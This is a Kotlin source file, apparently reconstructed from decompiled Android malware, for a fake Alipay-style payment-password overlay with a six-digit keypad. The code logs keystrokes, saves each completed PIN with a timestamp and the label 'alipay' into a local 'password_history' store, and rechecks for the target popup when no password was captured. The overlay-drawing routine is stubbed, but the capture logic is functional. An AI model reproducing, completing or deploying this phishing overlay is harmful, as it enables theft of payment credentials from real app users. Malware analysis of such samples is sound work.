package com.storm.safe.rock.service.modules

import android.content.Context
import android.content.SharedPreferences
import android.graphics.Color
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import org.json.JSONArray
import org.json.JSONObject

/**
 * Alipay-style password overlay with custom keypad.
 *
 * Reverse-engineered from JADX: C0353a0 (overlay/a0, 328 lines).
 * Renamed: a0→createOverlay, a1→dpToPx, a2→hideOverlay, a3→savePassword, a4→updateDisplay
 */
class OverlayWindowManager(private val context: Context) {

    companion object {
        private const val TAG = "AlipayPasswordOverlay"
        const val PASSWORD_LENGTH = 6
        const val OVERLAY_BG_COLOR = "#80000000"
        private const val BOX_BG_COLOR = "#F5F5F5"
        private const val ACTIVE_BORDER_COLOR = "#1677FF"
        private const val ERROR_COLOR = "#FF4444"
        private const val KEYPAD_BG_COLOR_STR = "#F0F0F0"
        private const val PREF_KEY = "history"

        @Volatile
        var instance: OverlayWindowManager? = null

        val KEYPAD_LAYOUT = arrayOf(
            arrayOf("1", "2", "3"),
            arrayOf("4", "5", "6"),
            arrayOf("7", "8", "9"),
            arrayOf("", "0", "DEL")
        )
    }

    private val windowManager: WindowManager =
        context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

    private var overlayView: FrameLayout? = null
    var isShowing: Boolean = false
        private set

    private var inputBuffer: String = ""
    private val passwordBoxes: ArrayList<TextView> = ArrayList()
    private var errorTextView: TextView? = null

    private val mainHandler: Handler = Handler(Looper.getMainLooper())
    private val retryHandler: Handler = Handler(Looper.getMainLooper())

    private val density: Float by lazy {
        context.resources.displayMetrics.density
    }

    // --- a0 → createOverlay ---
    fun createOverlay() {
        // vendor: C0353a0.m211895a0 — full overlay with GradientDrawable, LinearLayout, keypad buttons
        // Stub: overlay UI construction deferred to full WindowManager integration
        Log.d(TAG, "createOverlay called (stub)")
    }

    // --- a1 → dpToPx ---
    fun dpToPx(dp: Int): Int {
        return (density * dp).toInt()
    }

    // --- a2 → hideOverlay ---
    fun hideOverlay(passwordCaptured: Boolean) {
        if (!isShowing) return
        isShowing = false
        Log.d(TAG, "隐藏密码框，passwordCaptured=$passwordCaptured")
        if (!passwordCaptured) {
            Log.d(TAG, "安排 2 秒后重新检查弹窗")
            retryHandler.postDelayed({ /* retry check */ }, 2000L)
        }
        mainHandler.post {
            try {
                overlayView?.let { windowManager.removeView(it) }
            } catch (e: Exception) {
                Log.w(TAG, "removeView failed", e)
            }
        }
    }

    // --- a3 → savePassword ---
    fun savePassword(password: String, type: String, timestamp: Long) {
        try {
            val prefs = context.getSharedPreferences("password_history", Context.MODE_PRIVATE)
            val historyStr = prefs.getString(PREF_KEY, "") ?: ""
            val history = JSONArray(historyStr)
            val entry = JSONObject().apply {
                put("password", password)
                put("type", type)
                put("timestamp", timestamp)
                put("source", "alipay")
            }
            history.put(entry)
            prefs.edit()
                .putString(PREF_KEY, history.toString())
                .putInt("count", history.length())
                .apply()
        } catch (e: Exception) {
            Log.e(TAG, "保存密码历史记录失败", e)
        }
    }

    // --- a4 → updateDisplay ---
    fun updateDisplay() {
        for (i in 0 until PASSWORD_LENGTH) {
            val box = passwordBoxes.getOrNull(i)
            box?.text = if (i < inputBuffer.length) "●" else ""
            // vendor: uses GradientDrawable with setColor + setCornerRadius for box backgrounds
        }
    }

    // --- Key press handler (from ViewOnClickListenerC1204s2) ---
    fun onKeyPress(key: String) {
        if (!isShowing) return
        if (key == "DEL") {
            if (inputBuffer.isNotEmpty()) {
                inputBuffer = inputBuffer.dropLast(1)
                updateDisplay()
            }
            return
        }
        if (inputBuffer.length < PASSWORD_LENGTH) {
            inputBuffer += key
            updateDisplay()
            if (inputBuffer.length == PASSWORD_LENGTH) {
                mainHandler.postDelayed({
                    // Password complete — submit
                    savePassword(inputBuffer, "keypad", System.currentTimeMillis())
                    hideOverlay(true)
                }, 300L)
            }
        }
    }
}
